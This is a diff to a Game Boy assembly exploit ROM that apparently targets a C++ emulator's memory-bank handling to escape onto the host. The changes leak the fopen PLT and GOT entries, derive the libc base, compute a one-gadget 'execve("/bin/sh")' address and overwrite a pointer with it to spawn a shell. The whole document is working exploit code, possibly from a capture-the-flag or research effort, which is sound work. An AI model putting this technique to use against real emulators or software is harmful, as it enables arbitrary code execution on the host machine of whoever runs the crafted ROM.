@@ -128,18 +128,16 @@ main:
     memcpy_8 $8008 LEAK
     memcpy_8 $8010 $a000
 
-    ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
-    ;memcpy_8 LEAK $8000
-    ;ld ($a000), a
-
-    ; Leak fopen PLT entry
+    ; Seek to call to fopen PLT entry
     sub_ptr_3 $8010 $01 $27 $d0
     memcpy_8 LEAK $8010
     ld a, ($a000) ; sanity check
 
-    ; Leak fopen GOT entry PLT->GOT offset
+    ; Leak fopen PLT entry,
+    ; by parsing the operand of the "call" instruction
     memcpy $8018 $a007 4
     memset $801c $00 4
+    ld a, ($a000) ; sanity check
 
     ; Leak fopen GOT entry
     add_ptr_3 $8018 $00 $00 $0b ; rip adjust
@@ -148,26 +146,17 @@ main:
     ; Map GOT
     memcpy_8 LEAK $8018
 
-    ; Leak libc fopen address
+    ; Leak libc fopen address,
+    ; Revealing the libc base
     memcpy_8 $8020 $a000
 
-    ; Leak libc environ address
-    memcpy_8 $8028 $8020
-    add_ptr_3 $8028 $16 $cc $f0
-
-    ; Map libc environ
-    memcpy_8 $d9c8 $8028
-
-    ; Leak environ stack address
-    memcpy_8 $8030 $a000
-
-    ; Map stack
-    memcpy_8 $d9c8 $8030
-    nop ; debugger
-    ld a, ($a000) ; sanity check
+    ; Load address of ROP gadget
+    ; 0xe3afe execve("/bin/sh", r15, r12)
+    add_ptr_3 $8020 $06 $11 $ee
 
     ; Restore buffer Processor::m_Opcodes.
     memcpy_8 $d9c8 $8008
+    memcpy_8 $a000 $8020
 
     ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
     memcpy_8 $d9c8 $8000
@@ -186,7 +175,7 @@ _memcpy_8:
 ; memcpy copies bytes from source to destination.
 ; de = destination address
 ; hl = source address
-; b  = byte count
+; c  = byte count plus one
 _memcpy:
     jp +
 -   ld a, (hl+)
@@ -198,7 +187,7 @@ _memcpy:
 
 ; memset fills a range in memory with a specified byte value.
 ; hl = destination address
-; c = byte count
+; c = byte count plus one
 ; a = byte value
 _memset:
     jr +
